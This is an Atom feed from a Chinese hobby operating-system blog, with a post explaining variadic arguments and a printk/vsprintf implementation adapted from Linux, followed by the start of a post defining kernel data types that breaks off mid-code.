<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>一个爱代码的Coder</title>
  
  
  <link href="http://www.shicoder.top/atom.xml" rel="self"/>
  
  <link href="http://www.shicoder.top/"/>
  <updated>2022-05-11T03:05:48.254Z</updated>
  <id>http://www.shicoder.top/</id>
  
  <author>
    <name>shilinkun</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>操作系统实现-printk</title>
    <link href="http://www.shicoder.top/posts/3959108240.html"/>
    <id>http://www.shicoder.top/posts/3959108240.html</id>
    <published>2022-05-06T01:51:04.000Z</published>
    <updated>2022-05-11T03:05:48.254Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>博客网址：<a href="http://www.shicoder.top/">www.shicoder.top</a><br>微信：18223081347<br>欢迎加群聊天 ：452380935</p></blockquote><p>这一次我们来实现最基础，也是最常见的函数<code>print</code>，大家都知道这个是可变参数函数，那具体怎么实现呢，我们慢慢来说吧</p><span id="more"></span><p>大家都知道我们常见的格式化输出函数<code>printf</code>里面有很多参数，比如</p><p><code>%[flags][width][.prec][h|l|L][type]</code></p><ul><li><code>%</code>：格式引入字符</li><li><code>flags</code>：可选的标志字符序列</li><li><code>width</code>：可选的宽度指示符</li><li><code>.prec</code>：可选的精度指示符</li><li><code>h|l|L</code>：可选的长度修饰符</li><li><code>type</code>：转换类型</li></ul><p>首先来说下变参是怎么实现的，其实变参和三个参数有关</p><ul><li><code>va_list</code>：保存可变参数指针</li><li><code>va_start</code>：启用可变参数</li><li><code>va_arg</code>：获取下一个参数</li><li><code>va_end</code>：结束可变参数</li></ul><p>这里我们是宏函数实现</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">char</span> *va_list; <span class="comment">// 保存可变参数</span></span><br><span class="line"><span class="comment">// 因为是将参数全部压栈，最后一个压栈的是参数的个数，所以只需要挨着在内存中找多少个就知道了</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> va_start(ap, v) (ap = (va_list)&amp;v + sizeof(char *)) <span class="comment">// 启用可变参数 指向v下一个参数地址</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> va_arg(ap, t) (*(t *)((ap += sizeof(char *)) - sizeof(char *))) <span class="comment">// 获取下一个参数 并将值转换为t格式</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> va_end(ap) (ap = (va_list)0) <span class="comment">// 结束可变参数</span></span></span><br></pre></td></tr></table></figure><p>基本上懂了这个原理，就可以基本实现<code>printf</code>函数，只不过这个函数多了一些格式化字符串的参数。先直接看下我们要最终得到什么</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">kernel_init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;    </span><br><span class="line"><span class="built_in">console_init</span>();</span><br><span class="line">    <span class="type">int</span> cnt = <span class="number">30</span>;</span><br><span class="line">    <span class="keyword">while</span> (cnt--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printk</span>(<span class="string">&quot;hello system %#010x\n&quot;</span>, cnt);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实就是输出30个十六进制数，占10位，不足前面用0填充，结果如下</p><p><img src="https://smypicture.oss-cn-beijing.aliyuncs.com/img/image-20220511105611360.png" alt="image-20220511105611360"></p><p>那么就是如何实现这个<code>printk</code>了，先看下它的代码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">char</span> buf[<span class="number">1024</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">printk</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *fmt, ...)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    va_list args;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="comment">// 此时的args就是fmt下一个参数的地址</span></span><br><span class="line">    <span class="built_in">va_start</span>(args, fmt);</span><br><span class="line">    <span class="comment">// 将内容格式化到buf里面</span></span><br><span class="line">    i = <span class="built_in">vsprintf</span>(buf, fmt, args);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">va_end</span>(args);</span><br><span class="line">    <span class="comment">// 写到控制台上</span></span><br><span class="line">    <span class="built_in">console_write</span>(buf, i);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我先来大概说下思路把，比如我们这一行</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printk</span>(<span class="string">&quot;hello system %#010x\n&quot;</span>, <span class="number">29</span>);</span><br></pre></td></tr></table></figure><p>那么进入<code>printk</code>之后，先定义了一个<code>char * args</code>，然后使用<code>va_start(args,fmt)</code>，此时<code>args</code>就会指向<code>hello system %#010x\n</code>的下一个参数，即29，那我们可以猜一下<code>vsprintf</code>的功能：将此时<code>args</code>的值，也就是29的地址，可能在函数里面先取<code>*</code>，得到29，然后按照不断遍历<code>fmt</code>，遇到格式化的时候，就将29给格式化进去，普通字符直接复制到<code>buf</code>中</p><p>最后使用<code>console_write</code>将<code>buf</code>的值打印出来</p><p>那么我们就去看下<code>vsprintf</code>的实现吧，这里是参考<code>linux</code>中的源码，因为这个函数确实是大佬才能写，太多边界情况了</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">vsprintf</span><span class="params">(<span class="type">char</span> *buf, <span class="type">const</span> <span class="type">char</span> *fmt, va_list args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> len;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 用于存放转换过程中的字符串</span></span><br><span class="line">    <span class="type">char</span> *str;</span><br><span class="line">    <span class="type">char</span> *s;</span><br><span class="line">    <span class="type">int</span> *ip;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// number() 函数使用的标志</span></span><br><span class="line">    <span class="type">int</span> flags;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> field_width; <span class="comment">// 输出字段宽度</span></span><br><span class="line">    <span class="type">int</span> precision;   <span class="comment">// min 整数数字个数；max 字符串中字符个数</span></span><br><span class="line">    <span class="type">int</span> qualifier;   <span class="comment">// &#x27;h&#x27;, &#x27;l&#x27; 或 &#x27;L&#x27; 用于整数字段</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 首先将字符指针指向 buf</span></span><br><span class="line">    <span class="comment">// 然后扫描格式字符串，</span></span><br><span class="line">    <span class="comment">// 对各个格式转换指示进行相应的处理</span></span><br><span class="line">    <span class="keyword">for</span> (str = buf; *fmt; ++fmt)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 格式转换指示字符串均以 &#x27;%&#x27; 开始</span></span><br><span class="line">        <span class="comment">// 这里从 fmt 格式字符串中扫描 &#x27;%&#x27;，寻找格式转换字符串的开始</span></span><br><span class="line">        <span class="comment">// 不是格式指示的一般字符均被依次存入 str</span></span><br><span class="line">        <span class="keyword">if</span> (*fmt != <span class="string">&#x27;%&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            *str++ = *fmt;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 下面取得格式指示字符串中的标志域，并将标志常量放入 flags 变量中</span></span><br><span class="line">        flags = <span class="number">0</span>;</span><br><span class="line">    repeat:</span><br><span class="line">        <span class="comment">// 掉过第一个 %</span></span><br><span class="line">        ++fmt;</span><br><span class="line">        <span class="keyword">switch</span> (*fmt)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="comment">// 左对齐调整</span></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">            flags |= LEFT;</span><br><span class="line">            <span class="keyword">goto</span> repeat;</span><br><span class="line">        <span class="comment">// 放加号</span></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">            flags |= PLUS;</span><br><span class="line">            <span class="keyword">goto</span> repeat;</span><br><span class="line">        <span class="comment">// 放空格</span></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27; &#x27;</span>:</span><br><span class="line">            flags |= SPACE;</span><br><span class="line">            <span class="keyword">goto</span> repeat;</span><br><span class="line">        <span class="comment">// 是特殊转换</span></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;#&#x27;</span>:</span><br><span class="line">            flags |= SPECIAL;</span><br><span class="line">            <span class="keyword">goto</span> repeat;</span><br><span class="line">        <span class="comment">// 要填零(即&#x27;0&#x27;)，否则是空格</span></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">            flags |= ZEROPAD;</span><br><span class="line">            <span class="keyword">goto</span> repeat;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 取当前参数字段宽度域值，放入 field_width 变量中</span></span><br><span class="line">        field_width = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果宽度域中是数值则直接取其为宽度值</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">is_digit</span>(*fmt))</span><br><span class="line">            field_width = <span class="built_in">skip_atoi</span>(&amp;fmt);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果宽度域中是字符 &#x27;*&#x27;，表示下一个参数指定宽度</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (*fmt == <span class="string">&#x27;*&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            ++fmt;</span><br><span class="line">            <span class="comment">// 因此调用 va_arg 取宽度值</span></span><br><span class="line">            field_width = <span class="built_in">va_arg</span>(args, <span class="type">int</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 若此时宽度值小于 0，则该负数表示其带有标志域 &#x27;-&#x27; 标志（左对齐）</span></span><br><span class="line">            <span class="keyword">if</span> (field_width &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// 因此还需在标志变量中添入该标志，并将字段宽度值取为其绝对值</span></span><br><span class="line">                field_width = -field_width;</span><br><span class="line">                flags |= LEFT;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 取格式转换串的精度域，并放入 precision 变量中</span></span><br><span class="line">        precision = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 精度域开始的标志是&#x27;.&#x27; 其处理过程与上面宽度域的类似</span></span><br><span class="line">        <span class="keyword">if</span> (*fmt == <span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            ++fmt;</span><br><span class="line">            <span class="comment">// 如果精度域中是数值则直接取其为精度值</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">is_digit</span>(*fmt))</span><br><span class="line">                precision = <span class="built_in">skip_atoi</span>(&amp;fmt);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 如果精度域中是字符&#x27;*&#x27;，表示下一个参数指定精度</span></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (*fmt == <span class="string">&#x27;*&#x27;</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// 因此调用 va_arg 取精度值</span></span><br><span class="line">                precision = <span class="built_in">va_arg</span>(args, <span class="type">int</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 若此时宽度值小于 0，则将字段精度值取为其绝对值</span></span><br><span class="line">            <span class="keyword">if</span> (precision &lt; <span class="number">0</span>)</span><br><span class="line">                precision = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 下面这段代码分析长度修饰符，并将其存入 qualifer 变量</span></span><br><span class="line">        qualifier = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">if</span> (*fmt == <span class="string">&#x27;h&#x27;</span> || *fmt == <span class="string">&#x27;l&#x27;</span> || *fmt == <span class="string">&#x27;L&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            qualifier = *fmt;</span><br><span class="line">            ++fmt;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 下面分析转换指示符</span></span><br><span class="line">        <span class="keyword">switch</span> (*fmt)</span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果转换指示符是&#x27;c&#x27;，则表示对应参数应是字符</span></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;c&#x27;</span>:</span><br><span class="line">            <span class="comment">// 此时如果标志域表明不是左对齐，</span></span><br><span class="line">            <span class="keyword">if</span> (!(flags &amp; LEFT))</span><br><span class="line">                <span class="comment">// 则该字段前面放入 (宽度域值 - 1) 个空格字符，然后再放入参数字符</span></span><br><span class="line">                <span class="keyword">while</span> (--field_width &gt; <span class="number">0</span>)</span><br><span class="line">                    *str++ = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">            *str++ = (<span class="type">unsigned</span> <span class="type">char</span>)<span class="built_in">va_arg</span>(args, <span class="type">int</span>);</span><br><span class="line">            <span class="comment">// 如果宽度域还大于 0，则表示为左对齐</span></span><br><span class="line">            <span class="comment">// 则在参数字符后面添加 (宽度值-1) 个空格字符</span></span><br><span class="line">            <span class="keyword">while</span> (--field_width &gt; <span class="number">0</span>)</span><br><span class="line">                *str++ = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果转换指示符是 &#x27;s&#x27;，则表示对应参数是字符串</span></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>:</span><br><span class="line">            s = <span class="built_in">va_arg</span>(args, <span class="type">char</span> *);</span><br><span class="line">            <span class="comment">// 首先取参数字符串的长度</span></span><br><span class="line">            len = <span class="built_in">strlen</span>(s);</span><br><span class="line">            <span class="comment">// 若其超过了精度域值, 则扩展精度域=字符串长度</span></span><br><span class="line">            <span class="keyword">if</span> (precision &lt; <span class="number">0</span>)</span><br><span class="line">                precision = len;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (len &gt; precision)</span><br><span class="line">                len = precision;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 此时如果标志域表明不是左对齐</span></span><br><span class="line">            <span class="keyword">if</span> (!(flags &amp; LEFT))</span><br><span class="line">                <span class="comment">// 则该字段前放入 (宽度值-字符串长度) 个空格字符</span></span><br><span class="line">                <span class="keyword">while</span> (len &lt; field_width--)</span><br><span class="line">                    *str++ = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">            <span class="comment">// 然后再放入参数字符串</span></span><br><span class="line">            <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; ++i)</span><br><span class="line">                *str++ = *s++;</span><br><span class="line">            <span class="comment">// 如果宽度域还大于 0，则表示为左对齐</span></span><br><span class="line">            <span class="comment">// 则在参数字符串后面，添加(宽度值-字符串长度)个空格字符</span></span><br><span class="line">            <span class="keyword">while</span> (len &lt; field_width--)</span><br><span class="line">                *str++ = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果格式转换符是&#x27;o&#x27;，表示需将对应的参数转换成八进制数的字符串</span></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;o&#x27;</span>:</span><br><span class="line">            str = <span class="built_in">number</span>(str, <span class="built_in">va_arg</span>(args, <span class="type">unsigned</span> <span class="type">long</span>), <span class="number">8</span>,</span><br><span class="line">                         field_width, precision, flags);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果格式转换符是&#x27;p&#x27;，表示对应参数的一个指针类型</span></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;p&#x27;</span>:</span><br><span class="line">            <span class="comment">// 此时若该参数没有设置宽度域，则默认宽度为 8，并且需要添零</span></span><br><span class="line">            <span class="keyword">if</span> (field_width == <span class="number">-1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                field_width = <span class="number">8</span>;</span><br><span class="line">                flags |= ZEROPAD;</span><br><span class="line">            &#125;</span><br><span class="line">            str = <span class="built_in">number</span>(str,</span><br><span class="line">                         (<span class="type">unsigned</span> <span class="type">long</span>)<span class="built_in">va_arg</span>(args, <span class="type">void</span> *), <span class="number">16</span>,</span><br><span class="line">                         field_width, precision, flags);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 若格式转换指示是 &#x27;x&#x27; 或 &#x27;X&#x27;</span></span><br><span class="line">        <span class="comment">// 则表示对应参数需要打印成十六进制数输出</span></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;x&#x27;</span>:</span><br><span class="line">            <span class="comment">// &#x27;x&#x27;表示用小写字母表示</span></span><br><span class="line">            flags |= SMALL;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;X&#x27;</span>:</span><br><span class="line">            str = <span class="built_in">number</span>(str, <span class="built_in">va_arg</span>(args, <span class="type">unsigned</span> <span class="type">long</span>), <span class="number">16</span>,</span><br><span class="line">                         field_width, precision, flags);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果格式转换字符是&#x27;d&#x27;, &#x27;i&#x27; 或 &#x27;u&#x27;，则表示对应参数是整数</span></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;d&#x27;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;i&#x27;</span>:</span><br><span class="line">            <span class="comment">// &#x27;d&#x27;, &#x27;i&#x27;代表符号整数，因此需要加上带符号标志</span></span><br><span class="line">            flags |= SIGN;</span><br><span class="line">        <span class="comment">// &#x27;u&#x27;代表无符号整数</span></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;u&#x27;</span>:</span><br><span class="line">            str = <span class="built_in">number</span>(str, <span class="built_in">va_arg</span>(args, <span class="type">unsigned</span> <span class="type">long</span>), <span class="number">10</span>,</span><br><span class="line">                         field_width, precision, flags);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 若格式转换指示符是 &#x27;n&#x27;</span></span><br><span class="line">        <span class="comment">// 表示要把到目前为止转换输出的字符数保存到对应参数指针指定的位置中</span></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;n&#x27;</span>:</span><br><span class="line">            <span class="comment">// 首先利用 va_arg() 取得该参数指针</span></span><br><span class="line">            ip = <span class="built_in">va_arg</span>(args, <span class="type">int</span> *);</span><br><span class="line">            <span class="comment">// 然后将已经转换好的字符数存入该指针所指的位置</span></span><br><span class="line">            *ip = (str - buf);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="comment">// 若格式转换符不是 &#x27;%&#x27;，则表示格式字符串有错</span></span><br><span class="line">            <span class="keyword">if</span> (*fmt != <span class="string">&#x27;%&#x27;</span>)</span><br><span class="line">                <span class="comment">// 直接将一个 &#x27;%&#x27; 写入输出串中</span></span><br><span class="line">                *str++ = <span class="string">&#x27;%&#x27;</span>;</span><br><span class="line">            <span class="comment">// 如果格式转换符的位置处还有字符，则也直接将该字符写入输出串中</span></span><br><span class="line">            <span class="comment">// 然后继续循环处理格式字符串</span></span><br><span class="line">            <span class="keyword">if</span> (*fmt)</span><br><span class="line">                *str++ = *fmt;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="comment">// 否则表示已经处理到格式字符串的结尾处，则退出循环</span></span><br><span class="line">                --fmt;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 最后在转换好的字符串结尾处添上字符串结束标志</span></span><br><span class="line">    *str = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回转换好的字符串长度值</span></span><br><span class="line">    i = str - buf;</span><br><span class="line">    <span class="built_in">assert</span>(i &lt; <span class="number">1024</span>);</span><br><span class="line">    <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然这个函数里面使用的一些辅助函数也可以在<code>linux</code>源码找到，由于不是本文的代码实现重点，就不再进行讲解</p><p>那么我们以后就可以简单的使用<code>printk</code>函数进行实现打印啦</p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;博客网址：&lt;a href=&quot;http://www.shicoder.top/&quot;&gt;www.shicoder.top&lt;/a&gt;&lt;br&gt;微信：18223081347&lt;br&gt;欢迎加群聊天 ：452380935&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;这一次我们来实现最基础，也是最常见的函数&lt;code&gt;print&lt;/code&gt;，大家都知道这个是可变参数函数，那具体怎么实现呢，我们慢慢来说吧&lt;/p&gt;</summary>
    
    
    
    <category term="操作系统" scheme="http://www.shicoder.top/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
    <category term="导航" scheme="http://www.shicoder.top/tags/%E5%AF%BC%E8%88%AA/"/>
    
    <category term="分享" scheme="http://www.shicoder.top/tags/%E5%88%86%E4%BA%AB/"/>
    
  </entry>
  
  <entry>
    <title>操作系统实现-进入内核</title>
    <link href="http://www.shicoder.top/posts/3093034767.html"/>
    <id>http://www.shicoder.top/posts/3093034767.html</id>
    <published>2022-05-05T12:53:36.000Z</published>
    <updated>2022-05-06T01:50:01.329Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>博客网址：<a href="http://www.shicoder.top/">www.shicoder.top</a><br>微信：18223081347<br>欢迎加群聊天 ：452380935</p></blockquote><p>这一次我们正式进入内核，编写相关的内核代码，也就是kernel代码</p><span id="more"></span><h1 id="数据类型定义"><a href="#数据类型定义" class="headerlink" title="数据类型定义"></a>数据类型定义</h1><p>因为我们在内核中会使用一些数据，因此先提前定义一些数据类型</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> EOF -1 </span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NULL ((void *)0) <span class="comment">// 空指针</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EOS <span class="string">&#x27;\0&#x27;</span> <span class="comment">// 字符串结尾</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> bool _Bool</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> true 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> false 0</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _packed __attribute__((packed)) <span class="comment">// 用于定义特殊的结构体 不对齐</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">int</span> <span class="type">size_t</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">char</span> 